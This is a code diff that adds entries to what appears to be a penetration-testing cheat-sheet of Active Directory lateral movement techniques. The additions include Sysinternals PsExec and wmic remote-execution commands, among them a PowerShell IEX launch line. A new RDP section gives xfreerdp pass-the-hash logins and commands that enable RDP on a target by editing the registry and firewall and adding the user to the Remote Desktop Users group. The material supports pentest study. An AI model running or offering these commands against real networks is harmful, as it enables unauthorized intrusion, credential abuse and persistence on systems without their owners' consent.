@@ -23,6 +23,11 @@ impacket-psexec -hashes :<NTLM> <domain>/<user>@<target>`,
 impacket-atexec <domain>/<user>:<pass>@<target> 'whoami'
 netexec smb <target> -u <user> -p <pass> -x whoami`,
                 },
+                {
+                    label: 'Sysinternals PsExec',
+                    code: `PsExec64.exe -i -s \\\\<target> cmd
+PsExec64.exe \\\\<target> -u <domain>\\<user> -p <pass> -s cmd`,
+                },
             ],
             tags: ['psexec', 'smbexec', 'system', 'lateral'],
         },
@@ -79,8 +84,46 @@ Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{Comman
                     code: `impacket-wmiexec -hashes :<NTLM> <domain>/<user>@<target>
 netexec wmi <target> -u <user> -H <NTLM> -x whoami`,
                 },
+                {
+                    label: 'wmic process call create',
+                    code: `wmic /node:<target> /user:<domain>\\<user> /password:<pass> process call create "cmd /c whoami"
+wmic /node:<target> process call create "powershell -nop -c IEX(...)"`,
+                },
             ],
             tags: ['wmi', 'wmiexec', 'dcom', 'lateral'],
+        },
+        {
+            id: 'rdp-lateral',
+            title: 'RDP lateral movement',
+            type: 'technique',
+            phase: 'ad-lateral',
+            os: 'ad',
+            description:
+                'Port 3389 open and you have creds? RDP gives a full interactive desktop - ideal for GUI tools (BloodHound, Mimikatz) and screenshot proof. xfreerdp supports pass-the-hash against restricted-admin targets.',
+            commands: [
+                {
+                    label: 'Connect (password / hash)',
+                    code: `xfreerdp /v:<target> /u:<user> /p:<pass> /cert:ignore +clipboard /dynamic-resolution
+xfreerdp /v:<target> /u:<user> /pth:<NTLM> /cert:ignore   # restricted admin mode (PtH)`,
+                },
+                {
+                    label: 'Check reachability first',
+                    code: `netexec rdp <target> -u <user> -p <pass>
+netexec rdp <subnet>/24 -u <user> -p <pass>   # find RDP hosts for the creds`,
+                },
+                {
+                    label: 'xfreerdp3 (newer client)',
+                    code: `xfreerdp3 /v:<target> /u:<user> /p:<pass> /cert:ignore /dynamic-resolution +clipboard
+# /dynamic-resolution resizes with the window; /cert:ignore skips cert warnings`,
+                },
+                {
+                    label: 'Enable RDP on the target',
+                    code: `reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+net localgroup "Remote Desktop Users" <user> /add`,
+                },
+            ],
+            tags: ['rdp', '3389', 'xfreerdp', 'lateral', 'pth'],
         },
         {
             id: 'force-change-password',
@@ -162,6 +205,8 @@ impacket-secretsdump -ntds ntds.dit -system system.save LOCAL`,
         { from: 'force-change-password', to: 'creds-found', label: 'now know their password' },
         { from: 'pass-the-ticket', to: 'psexec-lateral', label: 'ticket -> exec' },
         { from: 'creds-found', to: 'wmi-lateral', label: 'try quiet exec' },
+        { from: 'creds-found', to: 'rdp-lateral', label: '3389 open + creds' },
+        { from: 'rdp-lateral', to: 'ad-foothold', label: 'interactive session on a new host' },
     ],
 }
 
